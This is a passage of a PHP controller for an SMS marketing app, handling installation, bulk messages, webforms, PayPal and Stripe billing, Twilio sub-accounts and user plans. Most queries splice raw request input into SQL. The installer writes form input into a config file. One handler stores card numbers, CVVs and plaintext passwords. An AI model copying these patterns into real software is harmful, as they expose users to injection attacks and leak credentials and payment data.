							$hostname = "'.$hname.'";

							$username = "'.$uname.'";

							$password = "'.$pword.'";

							$database = "'.$dbname.'";

							$link = mysqli_connect($hostname, $username, $password, $database);

							if(!$link){

								echo "Error: Unable to connect to MySQL." . PHP_EOL;

								echo "Debugging errno: " . mysqli_connect_errno() . PHP_EOL;

								echo "Debugging error: " . mysqli_connect_error() . PHP_EOL;

								exit;

							}

						?>';

				fwrite($dbFile, $content);

				fclose($dbFile);

				$dbStructure = dirname(__FILE__).'/installer/structure_nimble_messaging.sql';

				$lines = file($dbStructure);

				if(is_array($lines)){

					$importSql = "";

					foreach($lines as $line){

						$importSql .= $line;

						if(substr(trim($line), strlen(trim($line))-1) == ";"){

							mysqli_query($con,$importSql);

							$importSql = "";

						}

					}

				}

				header('location: installer/add_personal_info.php');

			}

		}

		break;

		

		case "check_db_conn":{

			$hname = $_REQUEST['hostname'];

			$dbname= $_REQUEST['dbname'];

			$uname = $_REQUEST['username'];

			$pword = $_REQUEST['password'];

			$con = mysqli_connect($hname, $uname, $pword, $dbname);

			if(!$con){

				echo 'Error: '.mysqli_error($con);

			}else{

				echo 'success';	

			}

		}

		break;

		case "delete_bulk_sms":{

			$sql = "delete from bulk_sms where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Message deleted.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Message not deleted.</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_bulk_sms":{

            if($_FILES['bulk_media']['name']!=''){

				$ext = getExtension($_FILES['bulk_media']['name']);

				$extns = array('jpg','jpeg','png','bmp','gif','mp3','mp4','pdf','txt');

				if(!in_array($ext,$extns)){

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

					header("location:".$_SERVER['HTTP_REFERER']);	

				}else{

					$fileName = uniqid().'_'.$_FILES['bulk_media']['name'];

					$tmpName  = $_FILES['bulk_media']['tmp_name'];

					@move_uploaded_file($tmpName,'uploads/'.$fileName);

					$bulk_media = getServerUrl().'/uploads/'.$fileName;

				}

			}else{

			     $bulk_media = $_REQUEST['hidden_bulk_media'];

			}

          

			$bulkMessage = $_REQUEST['bulk_sms'];

			$sql = "update bulk_sms set

						message='".DBin($bulkMessage)."',

                        bulk_media='".DBin($bulk_media)."'

					where

						id='".$_REQUEST['bulk_id']."'";

			$res = mysqli_query($link,$sql) or die(mysqli_error($link));

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Message updated.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while updating message.</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "save_bulk_sms":{

		  

          

            if($_FILES['bulk_media']['name']!=''){

				$ext = getExtension($_FILES['bulk_media']['name']);

				$extns = array('jpg','jpeg','png','bmp','gif','mp3','mp4','pdf','txt');

				if(!in_array($ext,$extns)){

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

					header("location:".$_SERVER['HTTP_REFERER']);	

				}else{

					$fileName = uniqid().'_'.$_FILES['bulk_media']['name'];

					$tmpName  = $_FILES['bulk_media']['tmp_name'];

					@move_uploaded_file($tmpName,'uploads/'.$fileName);

					$bulk_media = getServerUrl().'/uploads/'.$fileName;

				}

			}

          

			$bulkMessage = $_REQUEST['bulk_sms'];

			$sql = "insert into bulk_sms

						(message,user_id,bulk_media)

					values

						('".DBin($bulkMessage)."','".$_SESSION['user_id']."','".$bulk_media."')";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Message saved.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while saving message.</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "buy_credits":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			

            if($appSettings['payment_processor']==2){

                include_once("pay_with_authrize.php");       

            }else{

                if($appSettings['paypal_switch']=='1'){ // Live

    				$endPoint	= 'https://www.paypal.com/cgi-bin/webscr';

    				$businessEmail = $appSettings['paypal_email'];

    			}else{

    				$endPoint	= 'https://www.sandbox.paypal.com/cgi-bin/webscr';

    				$businessEmail = $appSettings['paypal_sandbox_email'];

    			}

    			$quantity = $_REQUEST['credit_quantity'];

    			$redirectUrl = getServerUrl();

    			$notifyUrl   = getServerUrl().'/credits_notify.php';

    			$perCreditRate = $appSettings['per_credit_charges'];

    			echo "Redirecting to paypal...";

    			echo '<form action="'.$endPoint.'" id="one_time_payment_from" name="one_time_payment_from" method="post">

    				<input type="hidden" name="business" value="'.$businessEmail.'" />

    				<input type="hidden" name="return" value="'.$redirectUrl.'" />

    				<input type="hidden" name="cancel_return" value="'.$redirectUrl.'" />

    				<input type="hidden" name="notify_url" value="'.$notifyUrl.'" />

    				<input type="hidden" name="cmd" value="_xclick" />

    				<input type="hidden" name="no_note" value="1" />

    				<input type="hidden" name="no_shipping" value="1">

    				<input type="hidden" value="USD" name="currency_code">

    				<input type="hidden" name="country" value="USA" />

    				<input type="hidden" name="item_name" value="'.$quantity.' SMS Credits" />

    				<input type="hidden" name="amount" value="'.round($perCreditRate,2).'" />

    				<input type="hidden" name="custom" value="'.$quantity.'_'.$_SESSION['user_id'].'" />

    				<input name="quantity" id="credits_value" type="hidden" value="'.$quantity.'">

    			</form>';

    			echo '<script>document.forms["one_time_payment_from"].submit();</script>';

            }

		}

		break;

		

		case "save_webform_subscriber":{

			header("Access-Control-Allow-Origin: *");

			$campaignID = $_REQUEST['campaign_id'];

			$email		= $_REQUEST['email'];

			$name		= $_REQUEST['name'];

			$phone		= $_REQUEST['phone'];

			$userID		= $_REQUEST['user_id'];

			$customSubsInfo = $_REQUEST['customSubsInfo'];

			$sel = "select id from subscribers where phone_number='".$phone."' and user_id='".$userID."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)==0){

				$sql = "select keyword,phone_number from campaigns where id='".$campaignID."'";

				$res = mysqli_query($link,$sql);

				if(mysqli_num_rows($res)){

					$row = mysqli_fetch_assoc($res);	

					$url		= getServerUrl().'/sms_controlling.php';

					$dataArray	= array(

						"To" => $row['phone_number'],

						"From" => $phone,

						"Body" => $row['keyword'],

						"subscriber_type" => 'webform',

						"subs_email" => $email,

						"name" => $name,

						'customSubsInfo' => $customSubsInfo

					);

					postData($url,$dataArray);

				}

				echo 'success';

			}else{

				$rec   = mysqli_fetch_assoc($exe);

				$subID = $rec['id'];

				$sqlc = "select id,status from subscribers_group_assignment where subscriber_id='".$subID."' and group_id='".$campaignID."' and user_id='".$userID."'";

				$resc = mysqli_query($link,$sqlc);

				if(mysqli_num_rows($resc)==0){

					echo 'success';

				}else{

					echo 'exists';

				}

			}

		}

		break;

		

		case "generate_embed_code":{

			$webFormID = $_REQUEST['wbf_id'];

			$sql = "select showing_method from webforms where id='".$webFormID."'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				$row = mysqli_fetch_assoc($res);

				if($row['showing_method']=='1'){ // to show in popup

					$url   = getServerUrl().'/getwbf.php?wbfid='.encode($webFormID).'&wbtype='.encode($row['showing_method']);

					echo '<script src="https://code.jquery.com/jquery-1.10.2.js"></script>';

					echo '<script type="text/javascript" src="'.$url.'"></script>';

					echo '<img src="'.getServerUrl().'/images/subscribe.png" id="mynm_id" style="cursor:pointer"/>';

				}else{ // to show on page

					$url   = getServerUrl().'/getwbf.php?wbfid='.encode($webFormID).'&wbtype='.encode($row['showing_method']);

					echo '<script src="https://code.jquery.com/jquery-1.10.2.js"></script>';

					echo '<script type="text/javascript" src="'.$url.'"></script>';

					echo '<div id="nmModalData"></div>';

				}

			}

		}

		break;

		

		case "delete_webform":{

			$sql = "delete from webforms where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Webform deleted successfully.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while deleting webform.</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_webform":{

			$sql = "update webforms set

						webform_name='".DBin($_REQUEST['webform_name'])."',

						campaign_id='".$_REQUEST['campaign_id']."',

						label_for_name_field='".DBin($_REQUEST['label_for_name_field'])."',

						label_for_phone_field='".DBin($_REQUEST['label_for_phone_field'])."',

						label_for_email_field='".DBin($_REQUEST['label_for_email_field'])."',

						disclaimer_text='".DBin($_REQUEST['disclaimer_text'])."',

						field_width='".DBin($_REQUEST['field_width'])."',

						field_height='".DBin($_REQUEST['field_height'])."',

						color_for_label='".DBin($_REQUEST['color_for_label'])."',

						frame_width='".DBin($_REQUEST['frame_width'])."',

						frame_height='".DBin($_REQUEST['frame_height'])."',

						frame_bg_color='".DBin($_REQUEST['frame_bg_color'])."',

						subs_btn_bg_color='".$_REQUEST['subs_btn_bg_color']."',

						close_btn_bg_color='".$_REQUEST['close_btn_bg_color']."',

						webform_type='".$_REQUEST['webform_type']."',

						custom_fields='".json_encode($_REQUEST['customFields'])."',

						label_for_disclaimer_text='".DBin($_REQUEST['label_for_disclaimer_text'])."',

						heading_for_custom_info_panel='".DBin($_REQUEST['heading_for_custom_info_panel'])."',

						showing_method='".$_REQUEST['showing_method']."'

					where

						id='".$_REQUEST['wbID']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Webform has been updated.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while updating webform</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "add_new_webform":{

			$sql = "insert into webforms(

						webform_name,

						campaign_id,

						label_for_name_field,

						label_for_phone_field,

						label_for_email_field,

						disclaimer_text,

						field_width,

						field_height,

						color_for_label,

						frame_width,

						frame_height,

						frame_bg_color,

						user_id,

						subs_btn_bg_color,

						close_btn_bg_color,

						webform_type,

						custom_fields,

						label_for_disclaimer_text,

						heading_for_custom_info_panel,

						showing_method

					)values(

						'".DBin($_REQUEST['webform_name'])."',

						'".$_REQUEST['campaign_id']."',

						'".DBin($_REQUEST['label_for_name_field'])."',

						'".DBin($_REQUEST['label_for_phone_field'])."',

						'".DBin($_REQUEST['label_for_email_field'])."',

						'".DBin($_REQUEST['disclaimer_text'])."',

						'".DBin($_REQUEST['field_width'])."',

						'".DBin($_REQUEST['field_height'])."',

						'".DBin($_REQUEST['color_for_label'])."',

						'".DBin($_REQUEST['frame_width'])."',

						'".DBin($_REQUEST['frame_height'])."',

						'".DBin($_REQUEST['frame_bg_color'])."',

						'".$_SESSION['user_id']."',

						'".$_REQUEST['subs_btn_bg_color']."',

						'".$_REQUEST['close_btn_bg_color']."',

						'".$_REQUEST['webform_type']."',

						'".json_encode($_REQUEST['customFields'])."',

						'".DBin($_REQUEST['label_for_disclaimer_text'])."',

						'".DBin($_REQUEST['heading_for_custom_info_panel'])."',

						'".$_REQUEST['showing_method']."'

					)";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Webform is saved.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while saving webform</div>';

			}

			header("location: view_webform.php");

		}

		break;

		

		case "delete_app_user":{

			$userID = decode($_REQUEST['id']);

			$res = mysqli_query($link,"delete from users where id='".$userID."'");

			if($res){

				// deleting campaigns

				mysqli_query($link,"delete from campaigns where user_id='".$userID."'");

				// end

				

				// deleting webforms

				mysqli_query($link,"delete from webforms where user_id='".$userID."'");

				// end

				

				// deleting schedulers

				mysqli_query($link,"delete from schedulers where user_id='".$userID."'");

				// end

				

				// deleting subscribers

				mysqli_query($link,"delete from subscribers where user_id='".$userID."'");

				mysqli_query($link,"delete from subscribers_group_assignment where user_id='".$userID."'");

				// end

				

				// deleting sms history

				mysqli_query($link,"delete from sms_history where user_id='".$userID."'");

				// end

				

				// deleting plans assignment

				mysqli_query($link,"delete from user_package_assignment where user_id='".$userID."'");

				// end

				

				// deleting payment history

				mysqli_query($link,"delete from payment_history where user_id='".$userID."'");

				// end

				

				// Releasing numbers from sub account.

				$appSettings = getAppSettings($userID);

				if((trim($appSettings['twilio_sid'])!='')&&(trim($appSettings['twilio_token'])!='')){

					$client = getTwilioConnection($userID);

					$sql = "select phone_sid from users_phone_numbers where user_id='".$userID."'";

					$exe = mysqli_query($link,$sql);

					if(mysqli_num_rows($exe)){

						while($row = mysqli_fetch_assoc($exe)){

							$phoneSid = $row['phone_sid'];

							if(trim($phoneSid)!=''){

								try{

									$client->account->incoming_phone_numbers->delete($phoneSid);

								}

								catch(Services_Twilio_RestException $e){

									//echo $e->getMessage();

								}

								mysqli_query($link,"delete from users_phone_numbers where phone_sid='".$phoneSid."'");

							}

						}

					}

					

					// Suspending sub account of twilio

					try{

						$account = $client->account; 

						$account->update(array(

							'Status' => "suspended" 

						));

					}catch(Services_Twilio_RestException $e){

						//echo $e->getMessage();

					}

					// end

				}

				

				// deleting application settings

				mysqli_query($link,"delete from application_settings where user_id='".$userID."'");

				// end

			}

			$_SESSION['message'] = '<div class="alert alert-success">User has been deleted.</div>';

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_app_user_by_admin":{

			$startDate = date('Y-m-d',strtotime($_REQUEST['start_date']));

			$endDate   = date('Y-m-d',strtotime($_REQUEST['end_date']));

			if($startDate>$endDate){

				$_SESSION['message'] = "Please select valid package date.";

				header("location: ".$_SERVER['HTTP_REFERER']);

			}

			$startDate = $startDate.' '.date('H').':00:00';

			$endDate   = $endDate.' '.date('H').':00:00';

			$password = $_REQUEST['password'];

			$rePassword = $_REQUEST['retype_password'];

			if(isset($_REQUEST['subs_lookup']))

				$subslookUp = $_REQUEST['subs_lookup'];

			else

				$subslookUp = '0';

			

			if($password==$rePassword){

				$check = "select id from users where email='".$_REQUEST['email']."' and id!='".$_REQUEST['user_id']."'";

				$resep = mysqli_query($link,$check);

				if(mysqli_num_rows($resep)==0){

					$sql = "update users set

							first_name='".$_REQUEST['first_name']."',

							last_name='".$_REQUEST['last_name']."',

							email='".$_REQUEST['email']."',

							password='".encodePassword($password)."',

							business_name='".$_REQUEST['business_name']."'

						where

							id='".$_REQUEST['user_id']."'";

					$res = mysqli_query($link,$sql)or die(mysqli_error($link));

					$userID = $_REQUEST['user_id'];

					// Updating app settings

					mysqli_query($link,"update application_settings set time_zone='".$_REQUEST['time_zone']."', subs_lookup='".$subslookUp."' where user_id='".$userID."'");

					// end

					$sel = "select id from user_package_assignment where user_id='".$userID."' and pkg_id='".$_REQUEST['pkg_id']."'";

					$exe = mysqli_query($link,$sel);

					if(mysqli_num_rows($exe)==0){

							// Deleting old assigned package

							mysqli_query($link,"delete from user_package_assignment where user_id='".$userID."'");

							$pkgInfo= getPackageInfo($_REQUEST['pkg_id']);

							$insPkg = "insert into user_package_assignment

(user_id,pkg_id,start_date,end_date,sms_credits,phone_number_limit,locations,reminders,pkg_country,iso_country)values

							('".$userID."','".$_REQUEST['pkg_id']."','".$startDate."','".$endDate."','".$pkgInfo['sms_credits']."','".$pkgInfo['phone_number_limit']."','".$pkgInfo['locations']."','".$pkgInfo['reminders']."','".$pkgInfo['country']."','".$pkgInfo['iso_country']."')";

							mysqli_query($link,$insPkg);

						}else{

							$up = "update user_package_assignment set								

										start_date='".$startDate."',

										end_date='".$endDate."'

									where

										user_id='".$userID."' and

										pkg_id='".$_REQUEST['pkg_id']."'";

							$exe = mysqli_query($link,$up);

						}

					if($res){

						$message = '<div class="alert alert-success">Success! User updated successfully.</div>';

					}else{

						$message = '<div class="alert alert-success">No changes were made to update.</div>';

					}

				}else{

					$message = '<div class="alert alert-danger">An account is already exists with same email, try another.</div>';

				}

			}else{

				$message = '<div class="alert alert-danger">Re-Password is not matching with your password.</div>';

			}

			$_SESSION['message'] = $message;

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "add_app_user_by_stripe":{

			$pkgInfo = getPackageInfo($_REQUEST['pkg_id']); 

            $check = "select id from users where email='".$_REQUEST['email']."'";

			$resep = mysqli_query($link,$check);

			if(mysqli_num_rows($resep)==0){

				if(isset($_REQUEST['stripeToken']) && $_REQUEST['stripeToken']!=""){

					$AppSettings = getAppSettings("",true);

					$password   = $_REQUEST['password'];

					$rePassword = $_REQUEST['retype_password'];

					if(trim($pkgInfo['free_days'])!=''){

						$freeDays = (int) $pkgInfo['free_days'];

					}else{

						$freeDays = 0;

					}

					if($password==$rePassword){

						require_once('stripe-php/init.php');

						\Stripe\Stripe::setApiKey($AppSettings['stripe_secret_key']);

						$planID = $pkgInfo['id'].'_'.uniqid();

						$ammount= (int)($pkgInfo['price']*100);

						$plan = \Stripe\Plan::create(array(

							"name" => $pkgInfo['title'],

							"id" => $planID,

							"interval" => "month",

							"currency" => "usd",

							"amount" => $ammount,

						));

						$customer = \Stripe\Customer::create(array(

							"email" => $_REQUEST['email'],

							'source' => $_REQUEST['stripeToken'],

						));					

						$subscription = \Stripe\Subscription::create(array(

							"customer" => $customer->id,

							"plan" => $planID,

							"trial_period_days" => $freeDays

						));

						

						$customerID = $customer->id;

						$subscriptionID = $subscription->id;

						$subscriptionData = @json_encode($subscription);

						try{

							$adminInfo = getAdminInfo();

							$adminID   = $adminInfo['id'];

							if($pkgInfo['sms_gateway']=='twilio'){

								// Creating twilio sub account

								$client = getTwilioConnection($adminID);

								$account= $client->accounts->create(array(

									"FriendlyName" => $_REQUEST['email']

								));

								$subAccountSid = $account->sid;

								$subAccountToken = $account->auth_token;

								// end

							}

							$encryptedPassword = encodePassword($password);

							$sql = "insert into users

										(

											first_name,

											last_name,

											email,

											password,

											business_name,

											tcap_ctia,

											msg_and_data_rate,

											type,

											customerID,

											subscriptionID,

											subscriptionData,

											parent_user_id

										)

									values

										(

											'".$_REQUEST['first_name']."',

											'".$_REQUEST['last_name']."',

											'".$_REQUEST['email']."',

											'".$encryptedPassword."',

											'".$_REQUEST['business_name']."',

											'1',

											'1',

											'2',

											'".$customerID."',

											'".$subscriptionID."',

											'".$subscriptionData."',

											'".$adminID."'

										)";

							$res = mysqli_query($link,$sql);

							if($res){

								$newUserID = mysqli_insert_id($link);

									$today	= date('Y-m-d H').':00:00';

									$endDate= date('Y-m-d H:i',strtotime('+1 month'.$today));

									$ins = "insert into user_package_assignment

												(

													user_id,

													pkg_id,

													start_date,

													end_date,

													sms_credits,

													phone_number_limit,
													
													locations,
													
													reminders,

													pkg_country,

													iso_country

												)

											values

												(

													'".$newUserID."',

													'".$pkgInfo['id']."',

													'".$today."',

													'".$endDate."',

													'".$pkgInfo['sms_credits']."',

													'".$pkgInfo['phone_number_limit']."',
													
													'".$pkgInfo['locations']."',
													
													'".$pkgInfo['reminders']."',

													'".$pkgInfo['country']."',

													'".$pkgInfo['iso_country']."'

												)";

									mysqli_query($link,$ins);

								// Adding app setting for new user

									$appSetts = "insert into application_settings

													(

														twilio_sid,

														twilio_token,

														user_id,

														user_type,

														time_zone

													)

												values

													(

														'".$subAccountSid."',

														'".$subAccountToken."',

														'".$newUserID."',

														'2',

														'".$_REQUEST['time_zone']."'

													)";

									mysqli_query($link,$appSetts);

									// end

							}else{

								$message = '<div class="alert alert-danger">Error! an error occured while creating new user.</div>';

							}

								

							// User notification

							$appUrl		 = getServerUrl();

							$subject = DBout($AppSettings['email_subject']);

							$to		 = $_REQUEST['email'];

							$from	 = 'admin@'.$_SERVER['SERVER_NAME'];

							$msg	 = $AppSettings['new_app_user_email'];

							$msg	 = str_replace('%first_name%',$_REQUEST['first_name'],$msg);

							$msg	 = str_replace('%last_name%',$_REQUEST['last_name'],$msg);

							$msg	 = str_replace('%login_email%',$_REQUEST['email'],$msg);

							$msg	 = str_replace('%login_pass%',$password,$msg);

							$msg	 = str_replace('%login_url%',$appUrl,$msg);

							$FullName= 'Admin';

							sendEmail($subject,$to,$from,$msg,$FullName);

							// End

								

							// Admin notification

							$subject = $AppSettings['email_subject_for_admin_notification'];

							$to		 = $AppSettings['admin_email'];

							$from	 = 'admin@'.str_replace('www.','',$_SERVER['SERVER_NAME']);

							$msg	 = str_replace('%email%',$_REQUEST['email'],$AppSettings['new_app_user_email_for_admin']);

							$FullName= 'Admin';

							sendEmail($subject,$to,$from,$msg,$FullName);

							// End

								

							// Adding payment history

							mysqli_query($link,"insert into payment_history	(payer_email,payer_status,txn_id,payment_status,gross_payment,product_name,user_id,payment_processor)

								values('".$_REQUEST['email']."','1','".$subscriptionID."','Completed','".$pkgInfo['price']."','".$pkgInfo['title']."','".$newUserID."','3')");

							// End

								

							$message = '<div class="alert alert-success">Your Account has been created successfully.</div>';

						}catch(Services_Twilio_RestException $e){

							$message = $e->getMessage();

						}

					}else{

						$message = '<div class="alert alert-danger">Re-Password is not matching with your password.</div>';

					}

					$_SESSION['message'] = $message;

					header("location: pricing_plans.php");

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">An account is already exists with same email, try another.</div>';

			}

		}

		break;

        

        case "add_app_user_by_admin":{

			date_default_timezone_set($_REQUEST['time_zone']);

            $pkgInfo = getPackageInfo($_REQUEST['pkg_id']);            

            if(isset($_REQUEST['parent_user_id']) && $_REQUEST['parent_user_id']!=""){

                $user_id = $_REQUEST['parent_user_id'];

            }else{

                $user_id = $_SESSION['user_id'];

            }

			$password   = $_REQUEST['password'];

			$rePassword = $_REQUEST['retype_password'];

			if($password==$rePassword){

				$check = "select id from users where email='".$_REQUEST['email']."'";

				$resep = mysqli_query($link,$check);

				if(mysqli_num_rows($resep)==0){

					try{

						$subAccountSid   = '';

						$subAccountToken = '';

						if($pkgInfo['sms_gateway']=='twilio'){

							// Creating twilio sub account

							$client = getTwilioConnection($user_id);

							$account= $client->accounts->create(array(

								"FriendlyName" => $_REQUEST['email']

							));

							// end

							$subAccountSid = $account->sid;

							$subAccountToken = $account->auth_token;

						}

						

						$encryptedPassword = encodePassword($password);

						$sql = "insert into users

							(first_name,last_name,email,password,parent_user_id,business_name,tcap_ctia,msg_and_data_rate,type)values

							('".$_REQUEST['first_name']."','".$_REQUEST['last_name']."','".$_REQUEST['email']."','".$encryptedPassword."','".$user_id."','".$_REQUEST['business_name']."','1','1','2')";

						$res = mysqli_query($link,$sql);

						if($res){

							$newUserID = mysqli_insert_id($link);

							

							

							if(isset($_REQUEST['response']) && $_REQUEST['response']!=""){

								$selss = "update users set response = '".$_REQUEST['response']."', response_code = '".$_REQUEST['response_code']."', subscription_id = '".$_REQUEST['subscription_id']."' where id='".$newUserID."'";

						        mysqli_query($link,$selss);

							}

							

							$today	= date('Y-m-d H').':00:00';

							$endDate= date('Y-m-d H:i',strtotime('+1 month'.$today));

							

							$ins = "insert into user_package_assignment

										(

											user_id,

											pkg_id,

											start_date,

											end_date,

											sms_credits,

											phone_number_limit,
											
											locations,
											
											reminders,

											pkg_country,

											iso_country,

											sms_gateway

										)

									values

										(

											'".$newUserID."',

											'".$pkgInfo['id']."',

											'".$today."',

											'".$endDate."',

											'".$pkgInfo['sms_credits']."',

											'".$pkgInfo['phone_number_limit']."',
											
											'".$pkgInfo['locations']."',
											
											'".$pkgInfo['reminders']."',

											'".$pkgInfo['country']."',

											'".$pkgInfo['iso_country']."',

											'".$pkgInfo['sms_gateway']."'

										)";

							mysqli_query($link,$ins);

							// Adding app setting for new user

							$sqls = "insert into application_settings 

									(

										twilio_sid,

										twilio_token,

										sms_gateway,

										user_id,

										app_logo,

										app_date_format,

										user_type,

										sidebar_color,

										time_zone,

										device_id

									)

								values

									(

										'".$subAccountSid."',

										'".$subAccountToken."',

										'".$pkgInfo['sms_gateway']."',

										'".$newUserID."',

										'nimble_messaging.png',

										'm-d-Y',

										'2',

										'purple',

										'".$_REQUEST['time_zone']."',

										'0'

									)";

							mysqli_query($link,$sqls);

							// end

						}else{

							$message = '<div class="alert alert-danger">Error! an error occured while creating new user.</div>';

						}

						

						$appSettings = getAppSettings($user_id);

						$appUrl		 = getServerUrl();

						$subject = DBout($appSettings['email_subject']);

						$to		 = $_REQUEST['email'];

						$from	 = 'admin@'.$_SERVER['SERVER_NAME'];

						$msg	 = $appSettings['new_app_user_email'];

						$msg	 = str_replace('%first_name%',$_REQUEST['first_name'],$msg);

						$msg	 = str_replace('%last_name%',$_REQUEST['last_name'],$msg);

						$msg	 = str_replace('%login_email%',$_REQUEST['email'],$msg);

						$msg	 = str_replace('%login_pass%',$password,$msg);

						$msg	 = str_replace('%login_url%',$appUrl,$msg);

						$FullName= 'Admin';

						sendEmail($subject,$to,$from,$msg,$FullName);

						

						// Admin notification

						$appSettings = getAppSettings($userID,true);

						$subject = $appSettings['email_subject_for_admin_notification'];

						$to		 = $appSettings['admin_email'];

						$from	 = 'admin@'.$_SERVER['SERVER_NAME'];

						$msg	 = str_replace('%email%',$row['email'],$appSettings['new_app_user_email_for_admin']);

						$FullName= 'Admin';

						sendEmail($subject,$to,$from,$msg,$FullName);

						

						

						$message = '<div class="alert alert-success">New application user has been created successfully.</div>';

					}catch(Services_Twilio_RestException $e){

						echo $e->getMessage();

					}

				}else{

					$message = '<div class="alert alert-danger">An account is already exists with same email, try another.</div>';

				}

			}else{

				$message = '<div class="alert alert-danger">Re-Password is not matching with your password.</div>';

			}

			$_SESSION['message'] = $message;

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "add_web_user":{

		    $webUserID = "";

			$pkgPrice = $_REQUEST['pkg_price'];

			$password = $_REQUEST['password'];

			$uid = $_REQUEST['uid'];

			$rePassword = $_REQUEST['retype_password'];

			if($password==$rePassword){

				$check = "select id from users where email='".$_REQUEST['email']."'";

				$resep = mysqli_query($link,$check);

				if(mysqli_num_rows($resep)==0){

					$sql = "insert into web_user_info

(pkg_id,first_name,last_name,email,password,parent_user_id,business_name,tcap_ctia,msg_and_data_rate,city,state,zip,address,card_number,cvv,year,month)values

							('".$_REQUEST['pkg_id']."','".$_REQUEST['first_name']."','".$_REQUEST['last_name']."','".$_REQUEST['email']."','".$password."','".$_REQUEST['parent_user_id']."','".$_REQUEST['business_name']."','".$_REQUEST['tcap_ctia']."','".$_REQUEST['msg_and_data_rate']."',

'".$_REQUEST['city']."','".$_REQUEST['state']."','".$_REQUEST['zip']."','".$_REQUEST['address']."','".$_REQUEST['card_number']."','".$_REQUEST['cvv']."','".$_REQUEST['year']."','".$_REQUEST['month']."')";

					$res = mysqli_query($link,$sql);

					if($res){

						$webUserID = mysqli_insert_id($link);

						$pkgInfo = getPackageInfo($_REQUEST['pkg_id']);

						redirectToPaypal($_REQUEST['parent_user_id'],$_REQUEST['pkg_title'],$pkgPrice,$webUserID,$pkgInfo);

					}else{

						$message = '<div class="alert alert-danger">Error occured while saving your profile information! please try again.</div>';

                        $_SESSION['message'] = $message;            

    			        header("location: ".$_SERVER['HTTP_REFERER']);                        

					}

				}else{

					$message = '<div class="alert alert-danger">An account is already exists with same email, try another.</div>';

                    $_SESSION['message'] = $message;            

    			    header("location: ".$_SERVER['HTTP_REFERER']);

				}

			}else{

				$message = '<div class="alert alert-danger">Re-Password is not matching with your password.</div>';

                $_SESSION['message'] = $message;            

    			header("location: ".$_SERVER['HTTP_REFERER']);

			}

                

            //header("location: ".$_SERVER['HTTP_REFERER'].'&message='.$message);

                        

                        

		}

		break;

		

		case "delete_plan":{

			$sql = "delete from package_plans where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				//mysqli_query($link,"delete from user_package_assignment where pkg_id='".$_REQUEST['id']."'");

				$_SESSION['message'] = '<div class="alert alert-danger">Pricing plan deleted successfully.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error occured while deleting plan.</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_plan":{

			$sql = "update package_plans set

						title='".DBin($_REQUEST['title'])."',
						
						locations='".DBin($_REQUEST['locations'])."',
						
						reminders='".DBin($_REQUEST['reminders'])."',

						sms_credits='".$_REQUEST['sms_credits']."',

						phone_number_limit='".$_REQUEST['phone_number_limit']."',

						currency='".$_REQUEST['currency']."',

						price='".$_REQUEST['price']."',

						country='".$_REQUEST['pkg_country']."',

						iso_country='".$_REQUEST['country']."',

						is_free_days='".$_REQUEST['is_free_days']."',

						free_days='".$_REQUEST['free_days']."',

						sms_gateway='".$_REQUEST['sms_gateway']."'

					where

						id='".$_REQUEST['pkg_id']."'";

			$res = mysqli_query($link,$sql)or die(mysqli_error($link));

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success">Pricing plan has been updated.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Error! occured while updating pricing plan.</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "save_pkg":{

			if($_REQUEST['is_free_days']=='')

				$isFreeDays = '0';

			else

				$isFreeDays = $_REQUEST['is_free_days'];

			

            $AppSettings = getAppSettings($_SESSION['user_id']);

			$sql = "insert into package_plans					

							(

								title,
								
								locations,
								
								reminders,

								sms_credits,

								phone_number_limit,

								currency,

								price,

								user_id,

								iso_country,

								country,

								is_free_days,

								free_days,

                                pkg_id,

								sms_gateway

							)

						values

							(

								'".DBin($_REQUEST['title'])."',
								
								'".DBin($_REQUEST['locations'])."',
								
								'".DBin($_REQUEST['reminders'])."',

								'".$_REQUEST['sms_credits']."',

								'".$_REQUEST['phone_number_limit']."',

								'".$_REQUEST['currency']."',

								'".$_REQUEST['price']."',

								'".$_SESSION['user_id']."',

								'".$_REQUEST['country']."',

								'".$_REQUEST['pkg_country']."',

								'".$isFreeDays."',

								'".$_REQUEST['free_days']."',

                                '".$pkgID."',

